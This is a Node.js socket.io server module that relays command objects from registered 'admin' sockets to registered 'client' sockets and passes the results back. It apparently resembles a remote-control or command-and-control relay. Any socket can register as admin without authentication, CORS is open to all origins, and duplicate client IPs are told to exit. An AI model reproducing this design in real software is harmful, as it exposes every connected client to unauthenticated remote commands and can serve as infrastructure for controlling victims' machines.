const { Server } = require('socket.io');
const { SOCKET_EVENTS } = require('../config/socketEvents');

const clients = new Map();
const admins = new Map();
const pendingCommands = new Map();

function generateCommandId() {
  return `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

function broadcastToAdmins(io, event, data) {
  admins.forEach((socket) => {
    socket.emit(event, data);
  });
}

function getAllClientsInfo() {
  const clientsInfo = [];
  clients.forEach((client, socketId) => {
    clientsInfo.push({
      socketId,
      info: client.info,
    });
  });
  return clientsInfo;
}

function initializeSocketIO(httpServer) {
  const io = new Server(httpServer, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST'],
    },
  });

  io.on('connection', (socket) => {
    const getSocketIp = () => {
      const h = socket.handshake || {};
      const forwarded = h.headers && (h.headers['x-forwarded-for'] || h.headers['x-real-ip']);
      const raw = forwarded
        ? String(forwarded).split(',')[0].trim()
        : (h.address || (socket.conn && socket.conn.remoteAddress) || '');
      return String(raw).replace(/^::ffff:/, '') || 'unknown';
    };

    const checkIPAddress = (ip) => {
      for (const [, client] of clients.entries()) {
        if (client.ip === ip) {
          return true;
        }
      }
      return false;
    };

    const registerClient = (info) => {
      const ip = getSocketIp();

      if (checkIPAddress(ip)) {
        socket.emit(SOCKET_EVENTS.COMMAND, {
          id: `exit_${Date.now()}`,
          data: { action: 'exit' },
        });
        return;
      }

      clients.set(socket.id, { socket, info, ip });
      broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_CONNECTED, {
        socketId: socket.id,
        info,
      });
    };

    const registerAdmin = () => {
      admins.set(socket.id, socket);
      socket.emit(SOCKET_EVENTS.CLIENTS_LIST, getAllClientsInfo());
    };

    const sendCommand = (payload) => {
      try {
        const { clientSocketId, data } = payload || {};
        const id = generateCommandId();
        const client = clients.get(clientSocketId);
        if (!client) {
          socket.emit(SOCKET_EVENTS.COMMAND_SENT, { id, clientSocketId });
          socket.emit(SOCKET_EVENTS.COMMAND_RESULT, {
            id,
            error: 'Client not found or disconnected',
            result: null,
            data: null,
          });
          return;
        }
        client.socket.emit(SOCKET_EVENTS.COMMAND, { id, data });
        socket.emit(SOCKET_EVENTS.COMMAND_SENT, { id, clientSocketId });
        pendingCommands.set(id, { admin: socket.id });
      } catch (err) {
        console.error('sendCommand error:', err);
        socket.emit(SOCKET_EVENTS.COMMAND_ERROR, { error: err?.message || 'Command failed' });
      }
    };

    const handleCommandResult = (data) => {
      const { id } = data;
      const pending = pendingCommands.get(id);
      if (!pending) return;
      pendingCommands.delete(id);
      const admin = admins.get(pending.admin);
      if (admin) {
        admin.emit(SOCKET_EVENTS.COMMAND_RESULT, data);
      }
    };

    const handleDisconnect = () => {
      if (clients.has(socket.id)) {
        const clientInfo = clients.get(socket.id).info;
        clients.delete(socket.id);
        broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_DISCONNECTED, {
          socketId: socket.id,
          info: clientInfo,
        });
      }

      if (admins.has(socket.id)) {
        admins.delete(socket.id);
        pendingCommands.forEach((value, key) => {
          if (value.admin === socket.id) {
            pendingCommands.delete(key);
          }
        });
      }
    };

    socket.on(SOCKET_EVENTS.CLIENT, registerClient);
    socket.on(SOCKET_EVENTS.ADMIN, registerAdmin);
    socket.on(SOCKET_EVENTS.SEND_COMMAND, sendCommand);
    socket.on(SOCKET_EVENTS.COMMAND_RESULT, handleCommandResult);
    socket.on(SOCKET_EVENTS.DISCONNECT, handleDisconnect);
  });

  return io;
}

module.exports = {
  initializeSocketIO,
  getAllClientsInfo,
  broadcastToAdmins,
  clients,
  admins,
  pendingCommands,
};
